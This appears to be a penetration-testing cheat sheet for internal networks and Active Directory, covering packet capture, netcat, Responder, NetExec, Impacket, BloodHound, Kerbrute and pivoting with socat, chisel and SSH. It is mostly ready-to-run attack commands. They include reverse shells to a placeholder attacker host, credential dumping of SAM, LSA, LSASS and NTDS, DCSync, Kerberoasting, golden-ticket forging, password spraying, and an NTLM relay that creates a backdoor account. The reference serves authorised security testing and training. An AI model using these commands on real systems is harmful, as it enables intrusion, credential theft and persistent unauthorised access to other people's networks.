# Network & Infrastructure Tools

!!! info "Purpose"
    Deep reference for network and infrastructure testing tools. Covers internal network assessment, Active Directory enumeration, credential attacks, and pivoting.

---

## Wireshark — Packet Analysis

### Core Workflow

```bash
# Start capture on interface
# GUI: Capture → Start → select interface

# CLI: tshark
tshark -i eth0                            # Live capture
tshark -i eth0 -w capture.pcap           # Save to file
tshark -r capture.pcap                   # Read pcap file
tshark -r capture.pcap -Y "http"         # Filter while reading
```

### Essential Display Filters

```
# Protocol filters
http                          # HTTP traffic
http.request                  # HTTP requests only
http.response                 # HTTP responses only
https or ssl or tls           # HTTPS/TLS traffic
dns                           # DNS queries and responses
smb or smb2                   # SMB traffic
ftp                           # FTP control connection
ftp-data                      # FTP data transfer
telnet                        # Telnet (cleartext)
ssh                           # SSH traffic
kerberos                      # Kerberos authentication
ldap or ldaps                 # LDAP directory queries
icmp                          # Ping and ICMP messages
arp                           # ARP requests/responses

# IP and address filters
ip.addr == 192.168.1.100      # Traffic to or from IP
ip.src == 192.168.1.100       # Traffic FROM IP
ip.dst == 192.168.1.100       # Traffic TO IP
ip.addr == 192.168.1.0/24     # Entire subnet
!(ip.addr == 192.168.1.1)     # Exclude IP

# Port filters
tcp.port == 80                # TCP port 80 either direction
tcp.dstport == 443            # Destination port 443
tcp.srcport == 4444           # Source port 4444
udp.port == 53                # UDP port 53

# Combined filters
ip.src == 192.168.1.50 and tcp.dstport == 80
http.request.method == "POST"
http.request.uri contains "login"

# Content filters
tcp contains "password"
http.request.uri contains "admin"
frame contains "NTLM"

# ARP poisoning detection
arp.duplicate-address-detected
# or look for: same MAC, different IPs
```

### Finding Credentials in Captures

```
# HTTP POST login forms
http.request.method == "POST" and http.request.uri contains "login"
# Then: Follow TCP Stream to see credentials

# FTP credentials
ftp.request.command == "USER" or ftp.request.command == "PASS"

# Telnet (all plaintext)
telnet
# Follow TCP Stream

# SMTP AUTH credentials
smtp.auth

# NTLM authentication (in HTTP, SMB, etc.)
ntlmssp
# Look for NTLMSSP_AUTH messages — contain NTLMv2 hashes

# Basic Auth in HTTP
http.authorization
# Base64 decode the value: echo "dXNlcjpwYXNz" | base64 -d
```

### tcpdump Quick Reference

```bash
# Capture all traffic
tcpdump -i eth0

# Capture to file
tcpdump -i eth0 -w /tmp/capture.pcap

# Read pcap
tcpdump -r capture.pcap

# Verbose output (show more fields)
tcpdump -v -r capture.pcap

# ASCII output (show payload text)
tcpdump -A -i eth0

# Hex + ASCII output
tcpdump -X -i eth0

# Capture filters (BPF syntax):
tcpdump -i eth0 port 80                  # Port filter
tcpdump -i eth0 host 192.168.1.100       # Host filter
tcpdump -i eth0 src host 192.168.1.100   # Source host
tcpdump -i eth0 dst port 443             # Destination port
tcpdump -i eth0 'tcp and port 80'        # Protocol + port
tcpdump -i eth0 'not arp and not icmp'  # Exclude protocols
tcpdump -i eth0 'port 21 or port 23'    # Multiple ports

# Capture only first N packets
tcpdump -i eth0 -c 100

# Capture with timestamps
tcpdump -i eth0 -tttt -w capture.pcap
```

---

## Netcat / Ncat

### Shells and Connections

```bash
# Listen for incoming connection
nc -lvnp 4444
# -l = listen, -v = verbose, -n = no DNS, -p = port

# Connect to listener
nc attacker_ip 4444

# Reverse shell (Linux)
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
nc attacker_ip 4444 -e /bin/bash    # if nc supports -e

# Bind shell (victim listens, attacker connects)
nc -lvnp 4444 -e /bin/bash          # Victim
nc victim_ip 4444                   # Attacker

# Encrypted (ncat, included with Nmap)
ncat --ssl -lvnp 4444               # Listener with SSL
ncat --ssl attacker_ip 4444         # Connect with SSL
```

### File Transfer

```bash
# Send file (attacker sends, victim receives)
# Receiver first:
nc -lvnp 9999 > received_file.txt
# Sender:
nc victim_ip 9999 < file_to_send.txt

# Directory transfer (with tar)
# Receiver:
nc -lvnp 9999 | tar xvf -
# Sender:
tar cvf - /path/to/dir | nc victim_ip 9999
```

### Banner Grabbing and Port Testing

```bash
# Banner grab
echo "" | nc -nv -w1 target_ip 22
echo "" | nc -nv -w1 target_ip 80
printf "GET / HTTP/1.0\r\n\r\n" | nc target_ip 80

# Quick port scan
nc -zv target_ip 20-100
nc -zv target_ip 80 443 8080 8443

# UDP port test
nc -zuv target_ip 53
nc -zuv target_ip 161
```

---

## Responder — LLMNR/NBT-NS Poisoning

```bash
# Basic Responder — captures NTLMv2 hashes
responder -I eth0

# Analyze mode (listen only, no poisoning — for assessment planning)
responder -I eth0 -A

# Enable WPAD (rogue proxy — captures proxy auth)
responder -I eth0 -wv

# Enable DHCP rogue (answer DHCP requests)
responder -I eth0 -d

# All options combined
responder -I eth0 -rdwv

# View captured hashes
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt

# Responder configuration
nano /etc/responder/Responder.conf
# Key settings:
# SMB = On/Off    (set Off when using ntlmrelayx for relay attacks)
# HTTP = On/Off   (set Off when relaying HTTP auth)
```

**Protocols Responder poisons:**
```
LLMNR    UDP/5355  — Link-Local Multicast Name Resolution
NBT-NS   UDP/137   — NetBIOS Name Service
mDNS     UDP/5353  — Multicast DNS
DHCP                — Optional rogue DHCP server
WPAD                — Web Proxy Auto-Discovery (captures proxy credentials)
```

**Responder fake servers (capture mode):**
```
SMB     → NTLMv2 hashes
HTTP    → NTLMv2 hashes or cleartext (Basic Auth)
HTTPS   → Same as HTTP (with self-signed cert)
FTP     → Cleartext credentials
SMTP    → Cleartext credentials
POP3    → Cleartext credentials
IMAP    → Cleartext credentials
DNS     → Resolves everything to attacker IP
MSSQL   → NTLMv2 hashes
LDAP    → NTLMv2 hashes
```

---

## CrackMapExec (CME) / NetExec

The Swiss army knife for Windows network assessment. NetExec is the actively maintained fork.

```bash
# Install NetExec (modern fork of CME)
pip install netexec
# Binary: nxc (or cme for CrackMapExec)

# Basic SMB enumeration
nxc smb 192.168.1.0/24

# Test credentials
nxc smb target -u admin -p 'Password123'
nxc smb target -u admin -p 'Password123' --local-auth  # Local account

# Pass-the-Hash
nxc smb target -u admin -H :NTLMhash
nxc smb target -u admin -H LMhash:NTLMhash

# Credential spraying
nxc smb 192.168.1.0/24 -u users.txt -p 'Summer2024!' --continue-on-success
nxc smb dc.corp.local -u users.txt -p passwords.txt --no-bruteforce

# Enumerate shares
nxc smb target -u user -p pass --shares

# List users (requires appropriate privileges)
nxc smb dc -u user -p pass --users
nxc smb dc -u user -p pass --groups
nxc smb dc -u user -p pass --computers
nxc smb dc -u user -p pass --pass-pol

# Check SMB signing (relay attack planning)
nxc smb 192.168.1.0/24 --gen-relay-list targets_nosigning.txt

# Execute commands (requires admin)
nxc smb target -u admin -p pass -x "whoami /all"           # CMD
nxc smb target -u admin -p pass -X "Get-LocalUser"         # PowerShell

# Dump credentials (requires admin)
nxc smb target -u admin -p pass --sam                      # SAM hashes
nxc smb target -u admin -p pass --lsa                      # LSA secrets
nxc smb target -u admin -p pass -M lsassy                  # LSASS dump (module)

# File operations
nxc smb target -u admin -p pass --get-file /windows/system32/drivers/etc/hosts ./hosts
nxc smb target -u admin -p pass --put-file ./payload.exe /windows/temp/payload.exe

# Spider shares
nxc smb target -u admin -p pass -M spider_plus             # Find interesting files

# Other protocols
nxc winrm target -u admin -p pass -x "whoami"             # PowerShell Remoting
nxc ldap dc -u admin -p pass --users                      # LDAP enumeration
nxc mssql target -u sa -p pass --query "SELECT @@version" # MSSQL
nxc ftp target -u admin -p pass --ls                      # FTP
nxc ssh target -u root -p pass -x "id"                   # SSH
```

---

## Impacket Suite

Python implementation of Windows networking protocols for Linux-based AD testing.

### Authentication and Remote Execution

```bash
# psexec — remote shell via SMB service creation (loud)
psexec.py corp.local/admin:password@target
psexec.py -hashes :NThash corp.local/admin@target

# smbexec — remote shell via SMB (no file upload, creates service)
smbexec.py corp.local/admin:password@target

# wmiexec — remote shell via WMI (no service creation, stealthier)
wmiexec.py corp.local/admin:password@target
wmiexec.py -hashes :NThash corp.local/admin@target

# atexec — execute via Task Scheduler
atexec.py corp.local/admin:password@target "whoami"

# dcomexec — execute via DCOM
dcomexec.py corp.local/admin:password@target "whoami"
```

### Credential Extraction

```bash
# secretsdump — remote credential dumping
# Dumps: SAM hashes, LSA secrets, NTDS hashes (from DC), DPAPI secrets
secretsdump.py corp.local/admin:password@target
secretsdump.py -hashes :NThash corp.local/admin@target

# Offline SAM dump
secretsdump.py -sam sam.hive -system system.hive LOCAL

# Offline NTDS dump (from DC)
secretsdump.py -ntds ntds.dit -system system.hive LOCAL

# DCSync (requires replication privileges)
secretsdump.py -just-dc corp.local/syncuser:password@dc.corp.local
secretsdump.py -just-dc-user krbtgt corp.local/admin:password@dc.corp.local
```

### Kerberos Operations

```bash
# Kerberoasting — enumerate and request service tickets
GetUserSPNs.py corp.local/user:password -dc-ip 192.168.1.10
GetUserSPNs.py corp.local/user:password -dc-ip 192.168.1.10 -request
GetUserSPNs.py corp.local/user:password -dc-ip 192.168.1.10 -outputfile kerberoast.txt

# AS-REP Roasting — request TGTs for accounts without preauth
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10
GetNPUsers.py corp.local/user:password -dc-ip 192.168.1.10 -request -outputfile asrep.txt

# Ticket operations
ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain corp.local administrator
export KRB5CCNAME=administrator.ccache

# Use Kerberos ticket
psexec.py -k -no-pass corp.local/administrator@dc.corp.local
```

### Network Protocol Utilities

```bash
# smbclient — SMB file operations
smbclient.py corp.local/user:password@target
> shares          # List shares
> use C$          # Connect to share
> ls              # List files
> get file.txt    # Download file
> put payload.exe # Upload file

# lookupsid — enumerate users via SID brute force
lookupsid.py corp.local/user:password@dc.corp.local 0-3000

# rpcdump — list RPC endpoints
rpcdump.py target

# samrdump — enumerate SAM via MSRPC
samrdump.py corp.local/user:password@target

# reg — remote registry access
reg.py corp.local/admin:password@target query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion'

# ntlmrelayx — NTLM relay attack
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -tf targets.txt -smb2support -c "net user hacker Pass123 /add"
ntlmrelayx.py -tf targets.txt -smb2support -i   # Interactive mode
ntlmrelayx.py -t ldaps://dc.corp.local --delegate-access
```

---

## enum4linux-ng — SMB/RPC Enumeration

```bash
# Full enumeration
enum4linux-ng -A target

# Specific components
enum4linux-ng -U target    # Users
enum4linux-ng -G target    # Groups
enum4linux-ng -S target    # Shares
enum4linux-ng -P target    # Password policy
enum4linux-ng -N target    # RID cycling (user enumeration)
enum4linux-ng -I target    # Printer information
enum4linux-ng -n target    # NetBIOS names

# Output formats
enum4linux-ng -A target -oY results.yaml
enum4linux-ng -A target -oJ results.json

# With credentials
enum4linux-ng -u admin -p password -A target

# Null session (no credentials)
enum4linux-ng -u '' -p '' -A target
```

---

## BloodHound / SharpHound

### Data Collection

```bash
# SharpHound (from Windows, domain-joined)
SharpHound.exe -c All
SharpHound.exe -c All --zipfilename collection.zip
SharpHound.exe -c DCOnly  # DC enumeration only (less noisy)
SharpHound.exe --stealth  # Slower but less detectable

# BloodHound.py (from Linux, no domain join needed)
pip install bloodhound
bloodhound-python -d corp.local -u user -p password -c All -ns dc_ip
bloodhound-python -d corp.local -u user -p password -c All -ns dc_ip --zip

# With Pass-the-Hash
bloodhound-python -d corp.local -u user \
  --hashes :NThash -c All -ns dc_ip
```

### BloodHound Analysis — Critical Queries

```
Pre-built queries (Analysis menu):

"Find Shortest Paths to Domain Admins"
→ Most important query — shows exact attack path from your current position

"Find All Domain Admins"
→ Lists all members of Domain Admins including nested group membership

"Find Computers where Domain Users are Local Admin"
→ Any domain user is local admin on these — easy lateral movement

"Find Kerberoastable Users"
→ Users with SPNs set — ticket cracking targets

"Find AS-REP Roastable Users"
→ Accounts with preauth disabled

"Find Principals with DCSync Rights"
→ Non-DC accounts that can replicate the domain — critical finding

"Shortest Paths to Unconstrained Delegation Systems"
→ Machines where incoming TGTs are cached — powerful coercion target

"Find Computers with Unsupported Operating Systems"
→ EOL systems — potentially vulnerable to EternalBlue, other unpatched CVEs
```

### BloodHound Custom Cypher Queries

```cypher
# Find users with local admin on most machines
MATCH (u:User)-[r:AdminTo]->(c:Computer)
RETURN u.name, COUNT(c) as machineCount
ORDER BY machineCount DESC

# Find all paths between specific nodes
MATCH p=shortestPath((s:User {name:"USER@CORP.LOCAL"})-[*..]->(t:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

# Find accounts with password not required
MATCH (u:User {passwordnotreqd: true})
RETURN u.name

# Find stale accounts (not logged in for 90+ days)
MATCH (u:User) WHERE u.lastlogon < (datetime().epochSeconds - 7776000)
  AND u.enabled = true
RETURN u.name, datetime({epochSeconds: toInteger(u.lastlogon)}) as lastLogon

# Find computers where specific user is admin
MATCH p=(u:User {name:"USER@CORP.LOCAL"})-[:AdminTo]->(c:Computer)
RETURN c.name
```

---

## Kerbrute — Kerberos Username and Password Testing

```bash
# Download binary
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64

# Username enumeration (Kerberos preauth - no lockout risk)
kerbrute userenum -d corp.local users.txt --dc dc.corp.local

# Password spraying (Kerberos - generates fewer logs than LDAP spray)
kerbrute passwordspray -d corp.local users.txt 'Summer2024!' --dc dc.corp.local

# Brute force single user (careful - this CAN trigger lockout)
kerbrute bruteuser -d corp.local alice rockyou.txt --dc dc.corp.local

# Output to file
kerbrute userenum -d corp.local users.txt --dc dc.corp.local -o valid_users.txt
```

**Why Kerbrute over LDAP spray:**
- Kerberos preauth errors (event 4771) generate fewer alerts in many environments vs LDAP events (4625)

- Doesn't require network access to LDAP (389) — only needs Kerberos (88)

- Valid username enumeration: AS-REQ without preauth returns different error for valid vs invalid usernames

---

## Socat — Versatile Networking Tool

```bash
# Relay / port forward (on pivot host)
socat TCP-LISTEN:8888,fork TCP:internal-server:80
# Traffic to pivot:8888 is forwarded to internal-server:80

# Relay with fork (handle multiple connections)
socat TCP-LISTEN:4444,fork,reuseaddr TCP:attacker:4444 &

# Create encrypted tunnel
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:localhost:4444

# File transfer
socat -u TCP-LISTEN:9999 OPEN:received_file.txt,creat  # Receiver
socat -u OPEN:file.txt TCP:target:9999                  # Sender

# PTY shell (fully interactive)
# Attacker: socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
# Victim:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:attacker:4444
```

---

## Chisel — HTTP Tunneling

```bash
# When SSH is not available and only HTTP egress exists

# Attacker: run server
chisel server --reverse --port 8080

# Victim: connect back and expose SOCKS proxy
chisel client attacker_ip:8080 R:socks
# This opens socks5://127.0.0.1:1080 on the attacker machine

# Configure proxychains:
# /etc/proxychains.conf:
# socks5 127.0.0.1 1080

# Now route all traffic through pivot:
proxychains nmap -sT 10.10.10.0/24
proxychains nxc smb 10.10.10.100
proxychains firefox  # Browse internal web apps

# Specific port forward
chisel client attacker_ip:8080 R:8888:internal-server:80
# localhost:8888 on attacker → internal-server:80 via victim
```

---

## SSH Tunneling for Pivoting

```bash
# Local port forward — access internal service through SSH
ssh -L [local_port]:[internal_host]:[internal_port] user@jump_host

# Example: access internal web server through SSH jump host
ssh -L 8080:192.168.10.5:80 user@jump.corp.com
# Now: curl http://localhost:8080 reaches 192.168.10.5:80

# Remote port forward — expose your listener through SSH
ssh -R [remote_port]:localhost:[local_port] user@target
# Example: victim can connect to target:4444 which reaches attacker:4444
ssh -R 4444:localhost:4444 user@pivot-host

# Dynamic port forward — SOCKS proxy through SSH
ssh -D 9050 user@jump_host
# Configure proxychains → socks5 127.0.0.1 9050
# All proxychains traffic routes through jump_host

# Multi-hop tunnel
ssh -L 8080:internal-server:80 -J jump1.corp.com user@jump2.internal.corp.com

# Keep tunnels alive
ssh -L 8080:target:80 -N -f user@jump    # -N = no command, -f = background

# Persistent tunnel with autossh
autossh -M 20000 -f -N -L 8080:target:80 user@jump
```
